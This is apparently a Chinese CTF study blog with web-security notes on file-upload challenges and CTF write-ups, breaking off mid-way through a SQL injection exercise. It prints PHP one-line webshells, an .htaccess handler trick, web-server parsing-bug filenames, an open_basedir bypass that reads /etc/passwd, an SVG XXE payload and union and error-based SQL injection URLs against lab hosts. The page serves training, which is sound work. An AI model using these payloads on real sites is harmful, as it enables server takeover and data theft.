class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>


<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>可伸缩矢量图，是一种XML，使用.svg保存</p>
<p>栗子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span> //XML申明，规定SVF文件是否含有对外部文件的引用</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span> // 引用外部SVG DTD</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>   // 开启SVG标签，设置SVG文档宽度和高度</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>/&gt;</span>  // 创建圆</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> // 闭合SVG标签</span><br></pre></td></tr></table></figure>
<h3 id="SVG-的-XSS"><a href="#SVG-的-XSS" class="headerlink" title="SVG 的 XSS"></a>SVG 的 XSS</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/434168767_99907709">https://www.sohu.com/a/434168767_99907709</a></p>
<p>原理</p>
<p>​    SVG支持通过脚本语言动态访问和修改SVG内容，类似于HTML的DOM</p>
<h2 id="BabyUpload（未做）"><a href="#BabyUpload（未做）" class="headerlink" title="BabyUpload（未做）"></a>BabyUpload（未做）</h2><p>来源：HFCTF2020</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>) <span class="comment">// 最终目标</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            safe_delete(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$direction</span> = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);  <span class="comment">// 从脚本外部获取输入 filter_input(input_type,variable,filter,options)</span></span><br><span class="line"><span class="variable">$attr</span> = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize(<span class="variable">$file_path</span>));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Avatar-Uploader（未做）"><a href="#Avatar-Uploader（未做）" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="getshell（未做）"><a href="#getshell（未做）" class="headerlink" title="getshell（未做）"></a>getshell（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Upload-Labs（未做）"><a href="#Upload-Labs（未做）" class="headerlink" title="Upload Labs（未做）"></a>Upload Labs（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Avatar-Uploader（未做）-1"><a href="#Avatar-Uploader（未做）-1" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="EzUpload（未做）"><a href="#EzUpload（未做）" class="headerlink" title="EzUpload（未做）"></a>EzUpload（未做）</h2><p>来源：D3CTF 2019</p>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;php&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SerHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>


<h2 id="web-server解析漏洞"><a href="#web-server解析漏洞" class="headerlink" title="web server解析漏洞"></a>web server解析漏洞</h2><p>参考：<a target="_blank" rel="noopener" href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>从右往左解析</p>
<h3 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h3><p>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.jpg">www.xxx.com/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.asp;.jpg">www.xxx.com/logo.asp;.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行）   <br>b.文件夹类型<br>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/image/logo.jpg">www.xxx.com/image/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/image.asp/logo.jpg">www.xxx.com/image.asp/logo.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。）</p>
<h3 id="IIS-7-0"><a href="#IIS-7-0" class="headerlink" title="IIS 7.0"></a>IIS 7.0</h3><p>对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>a.一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br>b.低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>open_basedir是PHP中设置为了防御PHP跨目录文件读写的方法，本质上是一些目录的集合</p>
<p>这个命题比较大，目前只掌握了init_set的绕过方法</p>
<h3 id="init-set"><a href="#init-set" class="headerlink" title="init_set"></a>init_set</h3><p>chdir数量根据具体环境修改，<strong>一般要求是如果再chdir一次就进入根目录为止，比如php文件的位置为/www/admin/localhost_80/wwwroot/html/下,那么就要使用五次chdir(“..”);</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;tmpdir&#39;);</span><br><span class="line">chdir(&#39;tmpdir&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">$a&#x3D;file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SVG上传"><a href="#SVG上传" class="headerlink" title="SVG上传"></a>SVG上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="ckla3x5dj0000z0ushtnr0iis" data-title="CTF-Web-文件上传" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-CTFer成长之路2-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/" class="article-date">
  <time class="dt-published" datetime="2021-02-06T07:20:33.000Z" itemprop="datePublished">2021-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/">CTF-Web-CTFer成长之路2.1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2-1-3-2-使用Gopher协议扩展攻击面"><a href="#2-1-3-2-使用Gopher协议扩展攻击面" class="headerlink" title="2.1.3.2 使用Gopher协议扩展攻击面"></a>2.1.3.2 使用Gopher协议扩展攻击面</h1><h2 id="kali搭建redis"><a href="#kali搭建redis" class="headerlink" title="kali搭建redis"></a>kali搭建redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install redis</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/" data-id="ckkw052j80000bsuscl7hcz3l" data-title="CTF-Web-CTFer成长之路2.1" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-CTFer成长之第一章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" class="article-date">
  <time class="dt-published" datetime="2021-02-05T02:22:24.000Z" itemprop="datePublished">2021-02-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/">wp-CTFer成长之路-第一章</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="常见的搜集1"><a href="#常见的搜集1" class="headerlink" title="常见的搜集1"></a>常见的搜集1</h1><p>首先尝试/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;flag1_is_her3_fun.txt</span><br></pre></td></tr></table></figure>
<p>访问/flag1_is_her3_fun.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1:n1book&#123;info_1</span><br></pre></td></tr></table></figure>
<p>其次尝试index.php~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;index.php~</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2:s_v3ry_im</span><br></pre></td></tr></table></figure>
<p>最后尝试.index.php.swp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;.index.php.swp</span><br></pre></td></tr></table></figure>
<p>下载文件后，使用vim还原</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3:p0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;info_1s_v3ry_imp0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
<h2 id="index-php-swp"><a href="#index-php-swp" class="headerlink" title=".index.php.swp"></a>.index.php.swp</h2><p>vim在意外退出时生成的备份文件，.swp,.swo,.swn,.un.文件名.swp</p>
<p>恢复方法：vim -r *.swp</p>
<p>下载方法：.文件名.swp（不要忘了前置的点</p>
<h1 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h1><p>考察：githacker使用</p>
<p>环境：python3.8 kali</p>
<p>访问./git.config，有回显，说明有git泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git&#x2F;config</span><br></pre></td></tr></table></figure>
<p>使用githacker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git</span><br></pre></td></tr></table></figure>
<p>得到index.php，发现flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;git_looks_s0_easyfun&#125;</span><br></pre></td></tr></table></figure>
<h2 id="githacker"><a href="#githacker" class="headerlink" title="githacker"></a>githacker</h2><p>注意要使用git clone下载的版本</p>
<p>直接使用zip下载的版本，会无法使用</p>
<h1 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h1><p>考察：union注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; order by 4--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note</span><br><span class="line">fl4g,notes</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39; --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">fllllag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,fllllag from fl4g --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">n1book&#123;union_select_is_so_cool&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入-2"></a>sql注入-2</h1><p>考察：报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: admin&#39; or 1&#x3D;1 --+</span><br><span class="line">pass: 1234</span><br></pre></td></tr></table></figure>
<p>账号不存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;2&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，在URL后接?tips=1</p>
